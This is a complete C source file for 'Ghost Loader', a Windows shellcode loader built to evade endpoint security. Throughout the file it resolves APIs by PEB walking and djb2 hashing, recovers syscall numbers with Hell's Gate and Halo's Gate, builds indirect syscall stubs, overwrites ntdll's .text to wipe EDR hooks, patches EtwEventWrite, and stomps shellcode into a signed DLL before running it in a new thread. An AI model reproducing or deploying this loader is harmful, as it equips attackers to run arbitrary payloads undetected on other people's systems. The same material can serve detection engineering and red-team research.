// ============================================================
//  GHOST LOADER  —  Windows Advanced Shellcode Loader
// ============================================================
//  Techniques demonstrated:
//    1. PEB walking (gs:[0x60])              — no LoadLibrary
//    2. djb2 API hashing                     — no API strings
//    3. Manual PE export parsing             — no GetProcAddress
//    4. Hell's Gate SSN extraction           — dynamic syscall numbers
//    5. Halo's Gate neighbour walk           — recovers hooked SSNs
//    6. Dynamic indirect syscall stubs       — bypasses user-mode hooks
//    7. Module stomping into signed DLL      — memory looks backed
//    8. ETW patching                         — telemetry blind
// ============================================================

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// ------------------------------------------------------------
//  Private LDR_DATA_TABLE_ENTRY  (MinGW's winternl.h is minimal)
// ------------------------------------------------------------
typedef struct _GL_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} GL_LDR_ENTRY, *PGL_LDR_ENTRY;

// ------------------------------------------------------------
//  NT prototypes
// ------------------------------------------------------------
typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fnNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *fnNtWaitForSingleObject)(
    HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *fnLdrLoadDll)(
    PWCHAR, ULONG, PUNICODE_STRING, HMODULE*);

// ------------------------------------------------------------
//  Syscall table
// ------------------------------------------------------------
typedef struct {
    DWORD hash;
    WORD  ssn;
    PVOID stub;
} GL_SYSCALL;

static GL_SYSCALL g_sc[4];
#define SC_ALLOC   0
#define SC_PROTECT 1
#define SC_CREATE  2
#define SC_WAIT    3

// ============================================================
//  djb2 hashing — case insensitive
// ============================================================
#define SEED 5381

static DWORD djb2_a(const char *s) {
    DWORD h = SEED;
    int c;
    while ((c = *s++)) {
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + (DWORD)c;
    }
    return h;
}

static DWORD djb2_w(const WCHAR *s, USHORT byte_len) {
    DWORD h = SEED;
    USHORT n = byte_len / sizeof(WCHAR);
    for (USHORT i = 0; i < n; i++) {
        WCHAR c = s[i];
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + (DWORD)c;
    }
    return h;
}

// ============================================================
//  PEB Walk — find module base by name hash
// ============================================================
static PVOID peb_find(DWORD hash) {
    ULONG_PTR peb_addr;
#ifdef _WIN64
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb_addr));
#else
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(peb_addr));
#endif
    PPEB peb = (PPEB)peb_addr;
    PPEB_LDR_DATA ldr = peb->Ldr;

    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr && curr != head) {
        PGL_LDR_ENTRY e = (PGL_LDR_ENTRY)((BYTE*)curr - sizeof(LIST_ENTRY));
        if (e->BaseDllName.Buffer && e->BaseDllName.Length) {
            if (djb2_w(e->BaseDllName.Buffer, e->BaseDllName.Length) == hash)
                return e->DllBase;
        }
        curr = curr->Flink;
    }
    return NULL;
}

// ============================================================
//  Manual GetProcAddress via PE export parsing
// ============================================================
static PVOID pe_proc(PVOID mod, DWORD hash) {
    if (!mod) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod + rva);
    DWORD *names = (DWORD*)((BYTE*)mod + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)mod + exp->AddressOfFunctions);
    WORD  *ords  = (WORD*) ((BYTE*)mod + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *n = (const char*)((BYTE*)mod + names[i]);
        if (djb2_a(n) == hash) {
            PVOID addr = (PVOID)((BYTE*)mod + funcs[ords[i]]);
            // Skip forwarded exports
            if ((ULONG_PTR)addr >= (ULONG_PTR)exp &&
                (ULONG_PTR)addr <  (ULONG_PTR)exp + size)
                return NULL;
            return addr;
        }
    }
    return NULL;
}

// ============================================================
//  Hell's Gate — extract SSN from an NTDLL stub
//  Falls back to Halo's Gate if the stub is hooked
// ============================================================
static WORD extract_ssn(PVOID func) {
    if (!func) return 0;
    BYTE *p = (BYTE*)func;

    //  Unhooked stub:
    //      4C 8B D1              mov r10, rcx
    //      B8 XX XX 00 00        mov eax, SSN
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 &&
        p[3] == 0xB8 && p[6] == 0x00 && p[7] == 0x00) {
        return (WORD)(p[4] | (p[5] << 8));
    }

    //  Halo's Gate — SSNs are sequential in NTDLL export order.
    //  Scan neighbouring stubs (each stub ≈ 32 bytes) and derive
    //  the hooked SSN from a clean neighbour's SSN ± distance.
    for (int d = 1; d <= 500; d++) {
        BYTE *up = p + (d * 32);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 &&
            up[3] == 0xB8 && up[6] == 0x00 && up[7] == 0x00) {
            return (WORD)((up[4] | (up[5] << 8)) - d);
        }
        BYTE *dn = p - (d * 32);
        if (dn[0] == 0x4C && dn[1] == 0x8B && dn[2] == 0xD1 &&
            dn[3] == 0xB8 && dn[6] == 0x00 && dn[7] == 0x00) {
            return (WORD)((dn[4] | (dn[5] << 8)) + d);
        }
    }
    return 0;
}

// ============================================================
//  Dynamic syscall stubs
//     4C 8B D1          mov  r10, rcx
//     B8 XX XX 00 00    mov  eax, SSN
//     0F 05             syscall
//     C3                ret
// ============================================================
static const BYTE STUB[] = {
    0x4C, 0x8B, 0xD1,
    0xB8, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x05,
    0xC3
};
#define STUB_LEN 11
#define STUB_SSN 4

static BOOL build_syscall_stubs(PVOID ntdll) {
    // Stack-built API names — never hit .rdata
    char sAlloc[]   = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char sProtect[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char sCreate[]  = {'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0};
    char sWait[]    = {'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0};

    g_sc[SC_ALLOC  ].hash = djb2_a(sAlloc);
    g_sc[SC_PROTECT].hash = djb2_a(sProtect);
    g_sc[SC_CREATE ].hash = djb2_a(sCreate);
    g_sc[SC_WAIT   ].hash = djb2_a(sWait);

    PVOID p[4];
    p[SC_ALLOC  ] = pe_proc(ntdll, g_sc[SC_ALLOC  ].hash);
    p[SC_PROTECT] = pe_proc(ntdll, g_sc[SC_PROTECT].hash);
    p[SC_CREATE ] = pe_proc(ntdll, g_sc[SC_CREATE ].hash);
    p[SC_WAIT   ] = pe_proc(ntdll, g_sc[SC_WAIT   ].hash);

    for (int i = 0; i < 4; i++) {
        if (!p[i]) { printf("[-] Export %d not found\n", i); return FALSE; }
        g_sc[i].ssn = extract_ssn(p[i]);
        if (!g_sc[i].ssn) { printf("[-] SSN %d extraction failed\n", i); return FALSE; }
    }

    printf("[+] SSNs  alloc=0x%03X  protect=0x%03X  create=0x%03X  wait=0x%03X\n",
        g_sc[SC_ALLOC].ssn, g_sc[SC_PROTECT].ssn,
        g_sc[SC_CREATE].ssn, g_sc[SC_WAIT].ssn);

    // Bootstrap: use the REAL NtAllocateVirtualMemory once to carve
    // out a page for our own stubs.  After this call all operations
    // go through the stubs, bypassing any user-mode hook.
    fnNtAllocateVirtualMemory NtAlloc =
        (fnNtAllocateVirtualMemory)p[SC_ALLOC];
    fnNtProtectVirtualMemory NtProt =
        (fnNtProtectVirtualMemory)p[SC_PROTECT];

    PVOID page = NULL;
    SIZE_T page_size = 0x1000;
    NTSTATUS st = NtAlloc((HANDLE)-1, &page, 0, &page_size,
                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0 || !page) {
        printf("[-] Bootstrap alloc failed: 0x%08X\n", (unsigned)st);
        return FALSE;
    }

    // Lay down 4 stubs, 16 bytes apart for alignment
    BYTE *cur = (BYTE*)page;
    for (int i = 0; i < 4; i++) {
        memcpy(cur, STUB, STUB_LEN);
        *(WORD*)(cur + STUB_SSN) = g_sc[i].ssn;
        g_sc[i].stub = cur;
        cur += 16;
    }

    // Flip RW → RX  (avoid RWX pages)
    PVOID prot_addr = page;
    SIZE_T prot_size = 0x1000;
    ULONG old;
    st = NtProt((HANDLE)-1, &prot_addr, &prot_size,
                PAGE_EXECUTE_READ, &old);
    if (st != 0) {
        printf("[-] Bootstrap protect failed: 0x%08X\n", (unsigned)st);
        return FALSE;
    }

    printf("[+] Indirect syscall stubs @ %p\n", page);
    return TRUE;
}

// ============================================================
//  NTDLL Unhooking — refresh .text from pristine disk copy
// ============================================================
//  After this runs every EDR user-mode hook in ntdll is gone.
//  We use our own indirect syscalls so the unhook itself is
//  invisible to the hooks we're about to destroy.
// ============================================================
static BOOL unhook_ntdll(PVOID in_mem_ntdll) {
    // Stack-built path — no .rdata string
    char path[] = {'C',':','\\','W','i','n','d','o','w','s','\\',
                   'S','y','s','t','e','m','3','2','\\',
                   'n','t','d','l','l','.','d','l','l',0};

    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open disk ntdll\n");
        return FALSE;
    }

    DWORD fsize = GetFileSize(h, NULL);
    BYTE *disk = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fsize);
    if (!disk) { CloseHandle(h); return FALSE; }

    DWORD rd = 0;
    ReadFile(h, disk, fsize, &rd, NULL);
    CloseHandle(h);

    // Parse disk copy headers
    PIMAGE_DOS_HEADER dos_d = (PIMAGE_DOS_HEADER)disk;
    PIMAGE_NT_HEADERS nt_d  = (PIMAGE_NT_HEADERS)(disk + dos_d->e_lfanew);
    PIMAGE_SECTION_HEADER sec_d = IMAGE_FIRST_SECTION(nt_d);

    // Parse in-memory headers
    PIMAGE_DOS_HEADER dos_m = (PIMAGE_DOS_HEADER)in_mem_ntdll;
    PIMAGE_NT_HEADERS nt_m  = (PIMAGE_NT_HEADERS)((BYTE*)in_mem_ntdll + dos_m->e_lfanew);
    PIMAGE_SECTION_HEADER sec_m = IMAGE_FIRST_SECTION(nt_m);

    fnNtProtectVirtualMemory NtProt =
        (fnNtProtectVirtualMemory)g_sc[SC_PROTECT].stub;

    BOOL ok = FALSE;
    for (int i = 0; i < nt_m->FileHeader.NumberOfSections; i++) {
        // Match ".text"
        BYTE *n = sec_m[i].Name;
        if (n[0] == '.' && n[1] == 't' && n[2] == 'e' &&
            n[3] == 'x' && n[4] == 't') {

            PVOID  tgt      = (BYTE*)in_mem_ntdll + sec_m[i].VirtualAddress;
            SIZE_T tgt_size = sec_m[i].Misc.VirtualSize;
            BYTE  *src      = disk + sec_d[i].PointerToRawData;

            // Flip RX → RW via our indirect syscall
            PVOID  paddr = tgt;
            SIZE_T psize = tgt_size;
            ULONG  old;
            NTSTATUS st = NtProt((HANDLE)-1, &paddr, &psize,
                                 PAGE_READWRITE, &old);
            if (st != 0) {
                printf("[-] NTDLL unhook NtProtect RW: 0x%08X\n", (unsigned)st);
                break;
            }

            // Overwrite hooked bytes with the clean disk copy
            for (SIZE_T k = 0; k < tgt_size; k++) {
                ((volatile BYTE*)tgt)[k] = src[k];
            }

            // Flip back to RX
            paddr = tgt; psize = tgt_size;
            NtProt((HANDLE)-1, &paddr, &psize, old, &old);

            printf("[+] NTDLL .text refreshed — %u bytes (%d hooks wiped)\n",
                   (unsigned)tgt_size, 0);
            ok = TRUE;
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, disk);
    return ok;
}

// ============================================================
//  ETW Patch via our own indirect syscalls
// ============================================================
static void patch_etw(PVOID ntdll) {
    char name[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    PVOID etw = pe_proc(ntdll, djb2_a(name));
    if (!etw) return;

    // xor eax, eax ; ret
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    PVOID addr = etw;
    SIZE_T size = sizeof(patch);
    ULONG old;

    fnNtProtectVirtualMemory NtProt =
        (fnNtProtectVirtualMemory)g_sc[SC_PROTECT].stub;

    if (NtProt((HANDLE)-1, &addr, &size, PAGE_READWRITE, &old) == 0) {
        memcpy(etw, patch, sizeof(patch));
        addr = etw; size = sizeof(patch);
        NtProt((HANDLE)-1, &addr, &size, old, &old);
        printf("[+] EtwEventWrite patched @ %p\n", etw);
    }
}

// ============================================================
//  Module Stomping — load a legit signed DLL, overwrite .text
// ============================================================

// Try loading a DLL whose .text is large enough for the shellcode
static HMODULE try_load_dll(fnLdrLoadDll LdrLoadDll, WCHAR *name) {
    UNICODE_STRING us;
    us.Buffer        = name;
    us.Length         = (USHORT)(wcslen(name) * sizeof(WCHAR));
    us.MaximumLength  = us.Length + sizeof(WCHAR);
    HMODULE h = NULL;
    if (LdrLoadDll(NULL, 0, &us, &h) == 0 && h) return h;
    return NULL;
}

static PVOID stomp(PVOID ntdll, unsigned char *sc, size_t sc_len) {
    char sLdr[] = {'L','d','r','L','o','a','d','D','l','l',0};
    fnLdrLoadDll LdrLoadDll =
        (fnLdrLoadDll)pe_proc(ntdll, djb2_a(sLdr));
    if (!LdrLoadDll) { printf("[-] LdrLoadDll missing\n"); return NULL; }

    // Candidate DLLs sorted large → small .text sections
    // All are Microsoft-signed and rarely used by host processes
    WCHAR *candidates[] = {
        (WCHAR[]){'m','s','h','t','m','l','.','d','l','l',0},            // ~5 MB
        (WCHAR[]){'d','3','d','1','1','.','d','l','l',0},                // ~2 MB
        (WCHAR[]){'u','r','l','m','o','n','.','d','l','l',0},            // ~1.5 MB
        (WCHAR[]){'d','b','g','h','e','l','p','.','d','l','l',0},        // ~1.6 MB
        (WCHAR[]){'w','i','n','i','n','e','t','.','d','l','l',0},        // ~1 MB
        (WCHAR[]){'x','p','s','s','v','c','s','.','d','l','l',0},
        (WCHAR[]){'a','m','s','i','.','d','l','l',0},
        NULL
    };

    HMODULE h = NULL;
    PVOID text = NULL;
    DWORD text_size = 0;

    for (int c = 0; candidates[c]; c++) {
        h = try_load_dll(LdrLoadDll, candidates[c]);
        if (!h) continue;

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
        PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                sec[i].Misc.VirtualSize >= sc_len) {
                text = (BYTE*)h + sec[i].VirtualAddress;
                text_size = sec[i].Misc.VirtualSize;
                break;
            }
        }
        if (text) {
            printf("[+] Stomp host loaded @ %p\n", (PVOID)h);
            break;
        }
    }

    // Fallback: if no DLL .text is large enough, use VirtualAlloc via
    // our indirect syscalls.  Less stealthy (private commit) but works.
    if (!text) {
        printf("[!] No DLL .text large enough — falling back to alloc\n");
        fnNtAllocateVirtualMemory NtAlloc =
            (fnNtAllocateVirtualMemory)g_sc[SC_ALLOC].stub;
        fnNtProtectVirtualMemory NtProt =
            (fnNtProtectVirtualMemory)g_sc[SC_PROTECT].stub;

        PVOID mem = NULL;
        SIZE_T sz = sc_len;
        NTSTATUS st = NtAlloc((HANDLE)-1, &mem, 0, &sz,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != 0 || !mem) {
            printf("[-] NtAlloc fallback: 0x%08X\n", (unsigned)st);
            return NULL;
        }
        memcpy(mem, sc, sc_len);

        PVOID addr = mem; SIZE_T ps = sc_len; ULONG old;
        st = NtProt((HANDLE)-1, &addr, &ps, PAGE_EXECUTE_READ, &old);
        if (st != 0) {
            printf("[-] NtProtect fallback: 0x%08X\n", (unsigned)st);
            return NULL;
        }
        printf("[+] Shellcode in private memory @ %p (indirect syscall)\n", mem);
        return mem;
    }

    printf("[+] .text @ %p  (%u bytes)\n", text, (unsigned)text_size);

    // Flip .text to RW via indirect syscall
    fnNtProtectVirtualMemory NtProt =
        (fnNtProtectVirtualMemory)g_sc[SC_PROTECT].stub;

    PVOID addr = text;
    SIZE_T size = sc_len;
    ULONG old;
    NTSTATUS st = NtProt((HANDLE)-1, &addr, &size, PAGE_READWRITE, &old);
    if (st != 0) { printf("[-] NtProtect RW: 0x%08X\n", (unsigned)st); return NULL; }

    memcpy(text, sc, sc_len);

    addr = text; size = sc_len;
    st = NtProt((HANDLE)-1, &addr, &size, PAGE_EXECUTE_READ, &old);
    if (st != 0) { printf("[-] NtProtect RX: 0x%08X\n", (unsigned)st); return NULL; }

    printf("[+] Shellcode stomped into legit module\n");
    return text;
}

// ============================================================
//  Execute via NtCreateThreadEx  (indirect syscall)
// ============================================================
static int execute(PVOID entry) {
    fnNtCreateThreadEx NtCreate =
        (fnNtCreateThreadEx)g_sc[SC_CREATE].stub;
    fnNtWaitForSingleObject NtWait =
        (fnNtWaitForSingleObject)g_sc[SC_WAIT].stub;

    HANDLE th = NULL;
    NTSTATUS st = NtCreate(&th, 0x1FFFFF, NULL, (HANDLE)-1,
                           entry, NULL, 0, 0, 0, 0, NULL);
    if (st != 0 || !th) {
        printf("[-] NtCreateThreadEx: 0x%08X\n", (unsigned)st);
        return -1;
    }
    printf("[+] Thread dispatched via indirect syscall\n");
    NtWait(th, FALSE, NULL);
    return 0;
}

// ============================================================
//  Read shellcode file
// ============================================================
static unsigned char *read_file(const char *path, size_t *out_len) {
    HANDLE h = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(h); return NULL; }
    unsigned char *b = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, size);
    DWORD rd = 0;
    ReadFile(h, b, size, &rd, NULL);
    CloseHandle(h);
    *out_len = size;
    return b;
}

// ============================================================
//  Main
// ============================================================
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("GHOST LOADER\n");
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    printf("[*] Ghost Loader — PEB walk + Hell's Gate + Module Stomp\n");

    // 1. PEB walk — NTDLL base (no LoadLibrary, no imports)
    char nt[] = {'n','t','d','l','l','.','d','l','l',0};
    PVOID ntdll = peb_find(djb2_a(nt));
    if (!ntdll) { printf("[-] NTDLL not in PEB\n"); return 1; }
    printf("[+] NTDLL @ %p  (via PEB walk)\n", ntdll);

    // 2. Build our own syscall stubs
    if (!build_syscall_stubs(ntdll)) return 1;

    // 3. Wipe every EDR user-mode hook in NTDLL by overwriting
    //    its .text with a pristine copy read from disk.  Our
    //    indirect syscalls stay functional through the whole op.
    unhook_ntdll(ntdll);

    // 4. Patch ETW using our stubs (on a now-clean ntdll)
    patch_etw(ntdll);

    // 4. Load shellcode from disk
    size_t sc_len = 0;
    unsigned char *sc = read_file(argv[1], &sc_len);
    if (!sc) { printf("[-] Read failed: %s\n", argv[1]); return 1; }
    printf("[+] Shellcode  %zu bytes\n", sc_len);

    // 5. Stomp into a legit signed DLL's .text
    PVOID entry = stomp(ntdll, sc, sc_len);

    // Wipe heap copy of shellcode
    SecureZeroMemory(sc, sc_len);
    HeapFree(GetProcessHeap(), 0, sc);

    if (!entry) return 1;

    // 6. Fire
    return execute(entry);
}
